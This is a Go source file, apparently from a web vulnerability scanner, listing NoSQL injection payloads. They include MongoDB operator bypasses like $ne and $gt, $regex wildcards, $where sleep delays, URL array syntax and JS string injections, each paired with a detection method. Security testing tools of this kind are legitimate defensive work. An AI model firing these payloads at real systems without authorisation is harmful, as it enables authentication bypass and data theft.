package nosqli_operator_injection

import "github.com/vigolium/vigolium/pkg/httpmsg"

// detectType identifies the kind of detection logic for a payload.
type detectType int

const (
	detectAuthBypass  detectType = iota // status change from 401/403 to 200
	detectSizeChange                    // response body significantly larger
	detectBooleanDiff                   // two requests produce different responses
	detectTimeDelay                     // response time significantly slower
)

// nosqliPayload represents a NoSQL injection payload with its detection strategy.
type nosqliPayload struct {
	value      string
	detectType detectType
	desc       string
}

// Category A: JSON operator payloads (for INS_PARAM_JSON insertion points)
var jsonOperatorPayloads = []nosqliPayload{
	{value: `{"$ne":""}`, detectType: detectAuthBypass, desc: "MongoDB $ne operator — not-equal empty bypasses auth"},
	{value: `{"$ne":null}`, detectType: detectAuthBypass, desc: "MongoDB $ne null — not-equal null bypasses auth"},
	{value: `{"$gt":""}`, detectType: detectAuthBypass, desc: "MongoDB $gt operator — greater-than empty matches all"},
	{value: `{"$gte":""}`, detectType: detectAuthBypass, desc: "MongoDB $gte operator — greater-than-or-equal empty matches all"},
	{value: `{"$regex":".*"}`, detectType: detectSizeChange, desc: "MongoDB $regex wildcard — matches all documents"},
	{value: `{"$regex":"^"}`, detectType: detectSizeChange, desc: "MongoDB $regex start anchor — matches all documents"},
	{value: `{"$exists":true}`, detectType: detectSizeChange, desc: "MongoDB $exists — field existence check bypasses value filter"},
	{value: `{"$where":"return true"}`, detectType: detectSizeChange, desc: "MongoDB $where — JS expression always returns true"},
	{value: `{"$where":"sleep(100)"}`, detectType: detectTimeDelay, desc: "MongoDB $where with sleep — time-based injection"},
	{value: `{"$eq":""}`, detectType: detectAuthBypass, desc: "MongoDB $eq operator"},
	{value: `{"$in":[""]}`, detectType: detectAuthBypass, desc: "MongoDB $in operator"},
	{value: `[{"$match":{"$gt":""}}]`, detectType: detectSizeChange, desc: "Aggregation pipeline injection"},
}

// Category B: URL array syntax payloads (for INS_PARAM_URL and INS_PARAM_BODY)
var urlArrayPayloads = []nosqliPayload{
	{value: "[$ne]=", detectType: detectAuthBypass, desc: "MongoDB $ne via URL array syntax"},
	{value: "[$ne]=1", detectType: detectAuthBypass, desc: "MongoDB $ne=1 via URL array syntax"},
	{value: "[$gt]=", detectType: detectAuthBypass, desc: "MongoDB $gt via URL array syntax"},
	{value: "[$regex]=.*", detectType: detectSizeChange, desc: "MongoDB $regex via URL array syntax"},
	{value: "[$exists]=true", detectType: detectSizeChange, desc: "MongoDB $exists via URL array syntax"},
}

// Category C: String injection payloads (for all insertion point types)
var stringInjectionPayloads = []nosqliPayload{
	{value: `' || '1'=='1`, detectType: detectBooleanDiff, desc: "NoSQL string injection — always-true condition"},
	{value: `" || "1"=="1`, detectType: detectBooleanDiff, desc: "NoSQL string injection — always-true double-quote"},
	{value: `'; return true; var a='`, detectType: detectBooleanDiff, desc: "NoSQL JS injection — return true"},
	{value: `"; return true; var a="`, detectType: detectBooleanDiff, desc: "NoSQL JS injection — return true double-quote"},
	{value: `' || '1'=='2`, detectType: detectBooleanDiff, desc: "NoSQL string injection — always-false condition (diff comparison)"},
	{value: `" || "1"=="2`, detectType: detectBooleanDiff, desc: "NoSQL string injection — always-false double-quote (diff comparison)"},
}

// getPayloadsForType returns the appropriate payloads for a given insertion point type.
func getPayloadsForType(ipType httpmsg.InsertionPointType) []nosqliPayload {
	switch ipType {
	case httpmsg.INS_PARAM_JSON:
		return append(jsonOperatorPayloads, stringInjectionPayloads...)
	case httpmsg.INS_PARAM_URL, httpmsg.INS_PARAM_BODY:
		return append(urlArrayPayloads, stringInjectionPayloads...)
	default:
		return stringInjectionPayloads
	}
}
